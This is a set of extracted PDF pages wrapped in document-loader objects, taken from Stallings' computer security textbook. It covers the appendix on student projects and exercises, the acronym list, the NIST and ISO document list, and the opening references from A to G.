       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 758, 'page_label': '757'}, page_content='A.4 / RESEARCH PROJECTS  757\\nA Webpage accessible through the Companion Website provides links to all \\nthe labs, organized by chapter. Each lab includes student instructions, relevant \\ndocuments, and any software needed to perform the lab. In addition, a link is pro -\\nvided for instructors to enable them to obtain the instructor manual.\\n A.4 RESEARCH PROJECTS\\nAn effective way of reinforcing basic concepts from the course and for teaching \\nstudents research skills is to assign a research project. Such a project could involve \\na literature search as well as an Internet search of vendor products, research lab \\nactivities, and standardization efforts. Projects could be assigned to teams or, for \\nsmaller projects, to individuals. In any case, it is best to require some sort of project \\nproposal early in the term, giving the instructor time to evaluate the proposal for \\nappropriate topic and appropriate level of effort. Student handouts for research \\nprojects should include:\\n• A format for the proposal\\n• A format for the final report\\n• A schedule with intermediate and final deadlines\\n• A list of possible project topics\\nThe students can select one of the topics listed in the IRC or devise their own \\ncomparable project. The instructor’s supplement includes a suggested format for \\nthe proposal and final report as well as a list of possible research topics.\\nThe following individuals have supplied the research and programming \\n projects suggested in the instructor’ s supplement: Henning Schulzrinne of \\n Columbia University; Cetin Ka ya Koc of Oregon State University; David M. \\nBalenson of Trusted Information Systems and George Washington University; \\nDan Wallach of Rice University; and David Evans of the University of Virginia.\\nTypes Labs Time (weeks) Chapters\\nDesign and Implementation Labs\\nVirtual Private Network (Linux) 4 22\\nIPsec (Minix) 4 22\\nFirewall (Linux) 2 9\\nFirewall (Minix) 2 9\\nRole-Based Access Control (Minix) 4 4\\nCapability-Based Access Control (Minix) 3 4\\nEncrypted File System (Minix) 4 12\\nAddress Space Randomization (Minix) 2 12\\nSet-Random UID Sandbox (Minix) 1 12\\nTable A.1 (Continued)\\nZ01_STAL0611_04_GE_APPA.indd   757 10/11/17   3:29 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 759, 'page_label': '758'}, page_content='758  APPENDIX A / PROJECTS AND OTHER STUDENT EXERCISES\\n A.5 PROGRAMMING PROJECTS\\nThe programming project is a useful pedagogical tool. There are several  attractive \\nfeatures of stand-alone programming projects that are not part of an existing \\n security facility:\\n1. The instructor can choose from a wide variety of cryptography and computer \\nsecurity concepts to assign projects.\\n2. The projects can be programmed by the students on any available computer \\nand in any appropriate language; they are platform- and language-independent.\\n3. The instructor need not download,  install, and configure any particular infra -\\nstructure for stand-alone projects.\\nThere is also flexibility in the size of projects. Larger projects give students \\nmore a sense of achievement, but students with less ability or fewer organizational \\nskills can be left behind. Larger projects usually elicit more overall effort from \\nthe best students. Smaller projects can have a higher concepts-to-code ratio, and \\nbecause more of them can be assigned, the opportunity exists to address a variety \\nof different areas.\\nAgain, as with research projects, the students should first submit a proposal. \\nThe student handout should include the same elements listed in the preceding \\nsection. The IRC includes a set of 12 possible programming projects.\\nThe following individuals have supplied the research and programming \\n projects suggested in the IRC: Henning Schulzrinne of Columbia University; \\nCetin Kaya Koc of Oregon State University; and David M. Balenson of Trusted \\n Information Systems and Geor ge Washington University.\\n A.6 PRACTICAL SECURITY ASSESSMENTS\\nExamining the current infrastructure and practices of an existing organization \\nis one of the best ways of developing skills in assessing its security posture. The \\nIRC contains a description of the tasks needed to conduct a security assessment. \\nStudents, working either individually or in small groups, select a suitable small- to \\nmedium-sized organization. They then interview some key personnel in that orga -\\nnization to conduct a suitable selection of security risk assessment and review tasks \\nas it relates to the organization’s IT infrastructure and practices. As a result, they \\ncan then recommend suitable changes, which can improve the organization’s IT \\nsecurity. These activities help students develop an appreciation of current security \\npractices, and the skills needed to review these and recommend changes.\\n A.7 FIREWALL PROJECTS\\nThe implementation of network firewalls can be a difficult concept for students to \\ngrasp initially. The IRC includes Network Firewall Visualization tool to convey and \\nteach network security and firewall configuration. This tool is intended to teach \\nZ01_STAL0611_04_GE_APPA.indd   758 10/11/17   3:29 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 760, 'page_label': '759'}, page_content='A.10 / WRITING ASSIGNMENTS  759\\nand reinforce key concepts including the use and purpose of a perimeter firewall, \\nthe use of separated subnets, the purposes behind packet filtering, and the short -\\ncomings of a simple packet filter firewall.\\nThe IRC includes a .jar file that is fully portable, and a series of exercises. The \\ntool and exercises were developed at U.S. Air Force Academy.\\n A.8 CASE STUDIES\\nTeaching with case studies engages students in active learning. The IRC includes \\ncase studies in the following areas:\\n• Disaster recovery\\n• Firewalls\\n• Incidence response\\n• Physical security\\n• Risk\\n• Security policy\\n• Virtualization\\nEach case study includes learning objectives , case description, and a series \\nof case discussion questions. Each case study is based on real-world situations and \\nincludes papers or reports describing the case.\\nThe case studies were developed at North Carolina A&T State University.\\n A.9 READING/REPORT ASSIGNMENTS\\nAnother excellent way to reinforce concepts from the course and to give students \\nresearch experience is to assign papers from the literature to be read and analyzed. \\nThe IRC includes a suggested list of papers to be assigned, organized by chapter. \\nThe Premium Content Website provides a copy of each of the papers. The IRC \\nalso includes a suggested assignment wording.\\n A.10 WRITING ASSIGNMENTS\\nWriting assignments can have a powerful multiplier effect in the learning process \\nin a technical discipline such as computer security. Adherents of the Writing Across \\nthe Curriculum (WAC) movement (http://wac.colostate.edu/) report substantial \\nbenefits of writing assignments in facilitating learning. Writing assignments lead to \\nmore detailed and complete thinking about a particular topic. In addition, writing \\nassignments help to overcome the tendency of students to pursue a subject with a \\nminimum of personal engagement, just learning facts and problem-solving tech -\\nniques without obtaining a deep understanding of the subject matter.\\nThe IRC contains a number of suggested writing assignments, organized by \\nchapter. Instructors may ultimately find that this is the most important part of their \\nZ01_STAL0611_04_GE_APPA.indd   759 10/11/17   3:29 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 761, 'page_label': '760'}, page_content='760  APPENDIX A / PROJECTS AND OTHER STUDENT EXERCISES\\napproach to teaching the material. We would greatly appreciate any feedback on \\nthis area and any suggestions for additional writing assignments.\\n A.11 WEBCASTS FOR TEACHING COMPUTER SECURITY\\nThe Companion Website provides a link to a catalog of webcast sites that can be \\nused to enhance the course. An effective way of using this catalog is to select, or \\nallow the student to select, one or a few videos to watch, then assign the student \\nto write a report/analysis of the video.\\nZ01_STAL0611_04_GE_APPA.indd   760 10/11/17   3:29 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 762, 'page_label': '761'}, page_content='761\\nAcronyms\\n3DES Triple Data Encryption Standard\\nABAC Attribute-Based Access Control\\nAES Advanced Encryption Standard\\nAH Authentication Header\\nANSI American National Standards  \\n Institute\\nATM Automatic Teller Machine\\nCBC Cipher Block Chaining\\nCC Common Criteria\\nCFB Cipher Feedback\\nCMAC Cipher-Based Message  \\n  Authentication Code\\nDAC Discretionary Access Control\\nDBMS Database Management System\\nDDoS Distributed Denial of Service\\nDES Data Encryption Standard\\nDMZ Demilitarized Zone\\nDoS Denial of Service\\nDSA Digital Signature Algorithm\\nDSS Digital Signature Standard\\nECB Electronic Codebook\\nESP Encapsulating Security Payload\\nFIPS Federal Information Processing  \\n Standard\\nIAB Internet Architecture Board\\nICMP Internet Control Message \\n Protocol\\nIDS Intrusion Detection System\\nIETF Internet Engineering Task Force\\nIP Internet Protocol\\nIPsec IP Security\\nISO International Organization  \\n for Standardization\\nITU International Telecommunication  \\n Union\\nITU-T ITU Telecommunication  \\n Standardization Sector\\nIV Initialization Vector\\nKDC Key Distribution Center\\nMAC Mandatory Access Control\\nMAC Message Authentication Code\\nMIC Message Integrity Code\\nMIME Multipurpose Internet Mail \\n Extension\\nMLS Multilevel Security\\nMTU Maximum Transmission Unit\\nNIDA Network-Based IDS\\nNIST National Institute of Standards  \\n and Technology\\nNSA National Security Agency\\nOFB Output Feedback\\nPIN Personal Identification Number\\nPIV Personal Identity Verification\\nPKI Public Key Infrastructure\\nPRNG Pseudorandom Number  \\n Generator\\nRDBMS Relational Database Management  \\n System\\nRBAC Role-Based Access Control\\nRFC Request for Comments\\nRNG Random Number Generator\\nRSA Rivest-Shamir-Adleman\\nSHA Secure Hash Algorithm\\nSHS Secure Hash Standard\\nS/MIME Secure MIME\\nSQL Structured Query Language\\nSSL Secure Sockets Layer\\nTCP Transmission Control Protocol\\nTLS Transport Layer Security\\nTPM Trusted Platform Module\\nUDP User Datagram Protocol\\nVPN Virtual Private Network\\nZ02_STAL0611_04_GE_ACR.indd   761 10/11/17   3:29 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 763, 'page_label': '762'}, page_content='762\\nList of Nist aNd iso documeNts\\nABBREVIATIONS\\nFIPS Federal Information Processing Standard\\nNIST National Institute of Standards and Technology\\nNISTIR NIST Internal/Interagency Report\\nSP  Special Publication\\nNIST DOCUMENTS\\nFIPS 46 Data Encryption Standard, January 1977 .\\nFIPS 113 Computer Data Authentication, May 1985.\\nFIPS 140-3 Security Requirements for Cryptographic Modules, September 2009.\\nFIPS 180-4 Secure Hash Standard (SHS), August 2015.\\nFIPS 181 Automated Password Generator (APG), October 1993 (withdrawn October \\n2015)\\nFIPS 186-4 Digital Signature Standard (DSS), July 2013\\nFIPS 197 Advanced Encryption Standard, November 2001.\\nFIPS 199 Standards for Security Categorization of Federal Information and Informa-\\ntion Systems, February 2004.\\nFIPS 200 Minimum Security Requirements for Federal Information and Information \\nSystems, March 2006\\nFIPS 201-2 Personal Identity Verification (PIV) of Federal Employees and Contractors, \\nAugust 2013\\nFIPS 202 SHA-3 Standard: Permutation-Based Hash and Extendable-Output Func -\\ntions, August 2015\\nNISTIR 7298 Glossary of Key Information Security Terms, May 2013.\\nSP 500-292 NIST Cloud Computing Reference Architecture, September 2011.\\nSP 800-12 An Introduction to Computer Security: The NIST Handbook, October 1995\\nSP 800-16 A Role-Based Model for Federal Information Technology/ Cybersecurity \\nTraining, March 2014\\nSP 800-18 Guide for Developing Security Plans for Feder al Information Systems, \\n February 2006.\\nSP 800-28 Guidelines on Active Content and Mobile Code, March 2008.\\nSP 800-30 Guide for Conducting Risk Assessments, September 2012.\\nSP 800-38A Recommendation for Block Cipher Modes of Operation: Methods and Tech-\\nniques, December 2001\\nSP 800-39 Managing Information Security Risk: Organization, Mission, and Informa-\\ntion System View, March 2011\\nSP 800-41 Guidelines on Firewalls and Firewall Policy, September 2009.\\nSP 800-53 Security and Privacy Controls for Federal Information Systems and Organi-\\nzations, January 2015.\\nSP 800-61 Computer Security Incident Handling Guide, August 2012.\\nZ03_STAL0611_04_GE_NIST.indd   762 10/11/17   3:29 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 764, 'page_label': '763'}, page_content='LIST OF NIST AND ISO DOCUMENTS  763\\nSP 800-63-3 Digital Authentication Guideline, August 2016.\\nSP 800-82 Guide to Industrial Control Systems (ICS) Security, May 2015.\\nSP 800-83 Guide to Malwar e Incident Prevention and Handling for Desktops and \\n Laptops, July 2013.\\nSP 800-92 Guide to Computer Security Log Management, September 2006\\nSP 800-94 Guide to Intrusion Detection and Prevention Systems, July 2012.\\nSP 800-97 Establishing Wireless Robust Security Networks: A Guide to IEEE 802.11i, \\nFebruary 2007\\nSP 800-100 Information Security Handbook: A Guide for Managers, October 2006\\nSP 800-116 A Recommendation for the Use of PIV Cr edentials in Physical Access \\n Control Systems (PACS), December 2015\\nSP 800-124 Guidelines for Managing the Security of Mobile Devices in the Enterprise, \\nJune 2013\\nSP 800-137 Information Security Continuous Monitoring (ISCM) for Federal Informa-\\ntion Systems and Organizations, September 2011\\nSP 800-144 Guidelines on Security and Privacy in Public Cloud Computing, December \\n2011.\\nSP 800-145 The NIST Definition of Cloud Computing, September 2011.\\nSP 800-146 Cloud Computing Synopsis and Recommendations, May 2012.\\nSP 800-162 Guide to Attribute Based Access Control (ABAC) Definition and Consid-\\nerations, January 2014.\\nSP 800-171 Protecting Controlled Unclassified Information in Nonfederal Information \\nSystems and Organizations, December 2016.\\nISO DOCUMENTS\\n12207 Information technology - Software lifecycle processes, 1997\\n13335 Management of information and communications technology security, 2004\\n27000 ISMS—Overview and Vocabulary, February 2016 \\n27001 ISMS—Requirements, October 2013\\n27002 Code of Practice for Information Security Controls, October 2013\\n27003 Information security management system implementation guidance, 2010\\n27004 Information security management - Measurement, 2009\\n27005 Information Security Risk Management, June 2011\\n27006 Requirements for bodies providing audit and certification of information \\nsecurity management systems, 2015\\n31000 Risk management - Principles and guidelines, 2009\\nSee Appendix C for further information on the NIST and ISO standards setting organizations.\\nZ03_STAL0611_04_GE_NIST.indd   763 10/11/17   3:29 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 765, 'page_label': '764'}, page_content='764\\nRefeRences\\nABBREVIATIONS\\nACM Association for Computing Machinery\\nIEEE Institute of Electrical and Electronics Engineers\\nRFC Request for Comments\\nACM04 The Association for Computing Machinery. USACM Policy Brief: Digital \\n Millennium Copyright Act (DMCA). February 6, 2004. http://www.acm.org \\n/usacm/Issues/DMCA.htm\\nACUN13 Acunetix, Inc. Web Application Security—Check your Site for Web Appli -\\ncation Vulnerabilities.  2013. http://www.acunetix.com/websitesecurity  \\n/webapp-security/2013\\nAGOS06 Agosta, J., et al. “Towards Autonomic Enterprise Security: Self-Defending \\nPlatforms, Distributed Detection, and Adaptive Feedback.” Intel Technology \\nJournal, November 9, 2006.\\nANDE80 Anderson, J. Computer Security Threat Monitoring and Surveillance.  Fort \\n Washington, PA: James P . Anderson Co., April 1980.\\nANLE07 Anley, C., et al. The Shellcoder’s Handbook: Discovering and Exploiting Secu-\\nrity Holes. Hoboken, NJ: John Wiley & Sons, 2007 .\\nANTE06 Ante, S., and Grow, B. “Meet the Hackers.” Business Week, May 29, 2006.\\nANTH07 Anthes, G. “Computer Security: Adapt or Die.” ComputerWorld, January 8, \\n2007 .\\nARBO10 Arbor Networks. Worldwide Infrastructure Security Report. January 2010.\\nARMY10 Department of the Army . Physical Security.  Field Manual FM 3-99.32, \\nAugust\\xa02010.\\nAROR11 Arora, K.; Kumar, K.; and Sachdeva, M. “Impact Analysis of Recent DDoS \\nAttacks.” International Journal on Computer Science and Engineering ,  \\nVol. 3, No. 2, February 2011.\\nAROR12 Arora, M. “How Secure Is AES against Brute-Force Attack?” EE Times, \\nMay\\xa07 , 2012.\\nAXEL00 Axelsson, S. “The Base-Rate Fallacy and the Difficulty of Intrusion  Detection.” \\nACM Transactions and Information and System Security, August 2000.\\nA YCO06 Aycock, J. Computer Viruses and Malware. New York: Springer, 2006.\\nBAIL05 Bailey, M., et al. “The Internet Motion Sensor: A Distributed Blackhole,” \\n Proceedings of the Network and Distributed System Security Symposium \\n Conference, February 2005.\\nBALA98 Balasubr amaniyan, J., et al. “An Architecture for Intrusion Detection \\nUsing Autonomous Agents.” Proceedings, 14th Annual Computer Security \\n Applications Conference, 1998.\\nBARD12 Bardou, R., et al, “Efficient Padding Oracle Attacks on Cryptographic Hard-\\nware.” INRIA, Rapport de recherche RR-7944, April 2012. http://hal.inria  \\n.fr/hal-00691958\\nBASU12 Basu, A. Intel AES-NI Performance Testing over Full Disk Encryption. Intel \\nCorp., May 2012.\\nZ04_STAL0611_04_GE_BIB.indd   764 10/11/17   3:29 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 766, 'page_label': '765'}, page_content='REFERENCES  765\\nBELL94 Bellovin, S., and Cheswick, W. “Network Firewalls.” IEEE Communications \\nMagazine, September 1994.\\nBELL96 Bellare, M.; Canetti, R.; and Krawczyk, H. “Keying Hash Functions for \\n Message Authentication.” Proceedings, CRYPTO ’96, August 1996; published \\nby  Springer-Verlag. An expanded version is available at http://www-cse.ucsd \\n.edu/users/mihir\\nBELL16 Bellovin, S. “Attack Surfaces.” IEEE Security & Privacy, May–June 2016.\\nBENN06 Ben-Natan, R. Data Security, Governance & Privacy: Protecting the Core of \\nYour Business. Guardium White Paper, 2006. www.guardium.com\\nBEUC13 Beuchelt, G. “Securing Web Applications, Services, and Servers.” In [VACC13].\\nBIDG06 Bidgoli, H., ed. Handbook of Information Security. Hoboken, NJ: Wiley, 2006.\\nBINS10 Binsalleeh, H., et al. “On the Analysis of the Zeus Botnet Crimeware  Toolkit.” \\nProceedings of the 8th Annual International Conference on Privacy, Security \\nand Trust, IEEE, September 2010.\\nBLEI98 Bleichenbacher, D. “Chosen Ciphertext Attacks against Protocols Based on \\nthe RSA Encryption Standard PKCS #1.” CRYPTO ’98, 1998.\\nBLOO70 Bloom, B. “Space/time Trade-offs in Hash Coding with Allowable Errors.” \\n Communications of the ACM, July 1970.\\nBONN12 Bonneau, J. “The Science of Guessing: Analyzing an Anonymized Vorpus of \\n70\\xa0Million Passwords.” IEEE Symposium on Security and Privacy, 2012.\\nBOSW14 Bosworth, S.; Kabay, M.; and Whyne, E., eds. Computer Security Handbook. \\nNew\\xa0York: Wiley, 2014.\\nBRAU01 Braunfeld, R., and Wells, T. “Protecting Your Most Valuable Asset:  Intellectual \\nProperty.” IT Pro, March/April 2001.\\nCARL06 Carl, G., et al. “Denial-of-Service Attack-Detection Techniques.” IEEE \\n Internet Computing, January-February 2006.\\nCARN03 Carnegie-Mellon Software Engineering Institute. Handbook for Computer \\nSecurity Incident Response Teams (CSIRTs) . CMU/SEI-2003-HB-002,  \\nApril 2003.\\nCASS01 Cass, S. “Anatomy of Malice.” IEEE Spectrum, November 2001.\\nCCPS12a Common Criteria Project Sponsoring Or ganisations. Common Criteria \\nfor Information Technology Security Evaluation, Part 1: Introduction and \\n General Model. CCIMB-2012-09-001, September 2012.\\nCCPS12b Common Criteria Project Sponsoring Organisations. Common Criteria for \\nInformation Technology Security Evaluation, Part 2: Security Functional \\n Components. CCIMB-2012-09-002, September 2012.\\nCHOI08 Choi, M., et al. “Wireless Network Security: Vulnerabilities, Threats and \\nCountermeasures.” International Journal of Multimedia and Ubiquitous \\nEngineering, July 2008.\\nCHAN02 Chang, R. “Defending against Flooding-Based Distributed Denial-of-Service \\nAttacks: A Tutorial.” IEEE Communications Magazine, October 2002.\\nCHAN09 Chandola, V.; Banerjee, A.; and Kumar, V . “Anomaly Detection: A Survey.” \\nACM Computing Surveys, July 2009.\\nCHAN11 Chandrashekhar, R., et al. “SQL Injection Attack Mechanisms and  Prevention \\nTechniques.” Proceedings of the 2011 international Conference on Advanced \\nComputing, Networking and Security, 2011\\nZ04_STAL0611_04_GE_BIB.indd   765 10/11/17   3:29 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 767, 'page_label': '766'}, page_content='766  REFERENCES\\nCHEN11 Chen, T., and Abu-Nimeh, S. “Lessons from Stuxnet” IEEE Computer ,  \\nVol. 44 No. 4, pp. 91–93, April 2011.\\nCLAR15 Clark, K.; Duckham, M.; Guillemin, M.; Hunter, A.; McVernon, J.; O’Keefe, \\nC.; Pitkin, C.; Prawer, S.; Sinnott, R.; Warr, D.; and Waycott, J. Guidelines \\nfor the Ethical use of Digital Data in Human Research , The University of \\n Melbourne, Melbourne, 2015.\\nCLEE09 van Cleeff, A.; Pieters, W.; and Wieringa, R. “Security Implications of Virtu-\\nalization: A Literature Study.” International Conference on Computational \\nScience and Engineering, IEEE, 2009.\\nCOHE94 Cohen, F. A Short Course on Computer Viruses. New York: Wiley, 1994.\\nCOLL06 Collett, S. “Encrypting Data at Rest.” Computerworld, March 27 , 2006.\\nCONR02 Conry-Murray, A. “Behavior-Blocking Stops Unknown Malicious Code.” \\nNetwork Magazine, June 2002.\\nCREE13 Creech, G. Developing a high-accuracy cross platform Host-Based Intrusion \\nDetection System capable of reliably detecting zero-day attacks. PhD Thesis, \\nThe University of New South Wales, 2013.\\nCSA11 Cloud Security Alliance. Security as a Service (SecaaS). CSA Report, 2011.\\nCSA13 Cloud Security Alliance. The Notorious Nine Cloud Computing Top Threats \\nin 2013. CSA Report, February 2013.\\nDAMI03 Damiani, E., et al. “Balancing Confidentiality and Efficiency in Untrusted \\nRelational Databases.” ACM Conference on Computer and Communications \\nSecurity, 2003.\\nDAMI05 Damiani, E., et al. “Key Management for Multi-User Encrypted Databases.” \\nProceedings, 2005 ACM Workshop on Storage Security and Survivability , \\n2005.\\nDAMO12 Damon, E., et al. “Hands-on denial of service lab exercises using SlowLo -\\nris and RUDY” In Proceedings of the 2012 Information Security Curriculum \\nDevelopment Conference, ACM, 2012.\\nDAMR03 Damron, J. “Identifiable Fingerprints in Network Applications.”; login, \\nDecember 2003.\\nDAUG04 Daugman, J. “Iris Recognition Border-Crossing System in the UEA.” \\n International Airport Review, Issue 2, 2004.\\nDA VI89 Davies, D., and Price, W. Security for Computer Networks. New York: Wiley, \\n1989.\\nDAWS96 Dawson, E., and Nielsen, L. “Automated Cryptoanalysis of XOR Plaintext \\nStrings.” Cryptologia, April 1996.\\nDEFW96 Dean, D .; Felten, E.; and Wallach, D. “Java Security: From HotJava to \\nNetscape and Beyond.” Proceedings IEEE Symposium on Security and \\n Privacy, IEEE, May 1996.\\nDENN71 Denning, P . “Third Generation Computer Systems.” ACM Computing \\n Surveys, December 1971.\\nDIFF76 Diffie, W., and Hellman, M. “New Directions in Cryptography.” Proceedings \\nof the AFIPS National Computer Conference, June 1976.\\nDIFF79 Diffie, W., and Hellman, M. “Privacy and Authentication: An Introduction to \\nCryptography.” Proceedings of the IEEE, March 1979.\\nDIMI07 Dimitriadis, C. “Analyzing the Security of Internet Banking Authentication \\nMechanisms.” Information Systems Control Journal, Vol. 3, 2007 .\\nZ04_STAL0611_04_GE_BIB.indd   766 10/11/17   3:29 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 768, 'page_label': '767'}, page_content='REFERENCES  767\\nDOJ00 U.S. Department of Justice. The Electronic Frontier: The Challenge of \\n Unlawful Conduct Involving the Use of the Internet. March 2000. http://www \\n.justice.gov/publications/publications_e.html\\nDU11 Du, W. “SEED: Hands-On Lab Exercises for Computer Security Education.” \\nIEEE Security & Privacy, September/October 2011.\\nEGEL12 Egele, M.; Scholte, T.; Kirda, E.; and Kruegel, C. “A Survey on Automated \\nDynamic Malware Analysis Techniques and Tools.” ACM Computing \\n Surveys, Vol. 44, No. 2, Article 6, February 2012.\\nEMBL08 Embleton, S.; Sparks, S.; and Zou, C. “SMM Rootkits: a New Breed of OS-\\nIndependent Malware.” Proceedings of the 4th International Conference on \\nSecurity and Privacy in Communication Networks, ACM, September 2008.\\nENGE80 Enger, N., and Howerton, P . Computer Security. New York: Amacom, 1980.\\nENIS09 European Network and Information Security Agency. Cloud Computing: \\nBenefits, Risks and Recommendations for Information Security.  ENISA \\nReport, November 2009.\\nENIS15 European Network and Information Security Agency. Cloud Security Guide \\nfor SMEs. ENISA Report, April 2015.\\nFEIS73 Feistel, H. “Cryptography and Computer Privacy.” Scientific American, May \\n1973.\\nFLUH01 Fluhrer, S.; Mantin, I.; and Shamir, A. “Weakness in the Key Scheduling Algo-\\nrithm of RC4.” Proceedings, Workshop in Selected Areas of Cryptography, 2001 .\\nFORR06 Forristal, J. “Physical/Logical Convergence.” Network Computing, November\\xa023, \\n2006.\\nFOSS10 Fossi M. et al, “Symantec Report on Attack Kits and Malicious Websites.” \\nSymantec, 2010.\\nFRAH15 Frahim, J., et al. Securing the Internet of Things: A Proposed Framework.  \\nCisco White Paper, March 2015.\\nGARC09  Garcia-Teodoro, P ., et al. “Anomaly-Based Network Intrusion Detection: \\nTechniques, Systems and Challenges.” Computer & Security, Vol. 28, 2009.\\nGAUD00 Gaudin, S. “The Omega Files.” Network World, June 26, 2000.\\nGEOR12 Georgiev, M., et al. “ The Most Dangerous Code in the World: Validating SSL \\nCertificates in Non-Browser Software.” ACM Conference on Computer and \\nCommunications Security, 2012.\\nGOLD10 Gold, S. “Social Engineering Today: Psychology, Strategies and Tricks.” \\n Network Security, November 2010.\\nGOOD11 Goodin, D. “Hackers Break SSL Encryption Used by Millions of Sites.” The \\nRegister, September 19, 2011.\\nGOOD12a Goodin, D. “Why Passwords Have Never Been Weaker—and Crackers Have \\nNever Been Stronger.” Ars Technica, August 20, 2012.\\nGOOD12b Goodin, D. “Crack in Internet’s Foundation of Trust Allows HTTPS Session \\nHijacking.” Ars Technica, September 13, 2012.\\nGOOD14 Goodin, D. “Critical Crypto Bug in OpenSSL Opens Two-Thirds of the Web \\nto Eavesdropping.” Ars Technica, April 7 , 2014.\\nGOOD17 Goodin, D. “Wanna Decryptor ransomware: What is it, and how does it \\nwork?.” Ars Technica, May 15, 2017 .\\nGOTT99 Gotterbarn, D. “How the New Software Engineering Code of Ethics Affects \\nYou.” IEEE Software, November/December 1999.\\nZ04_STAL0611_04_GE_BIB.indd   767 10/11/17   3:29 PM'),\n",
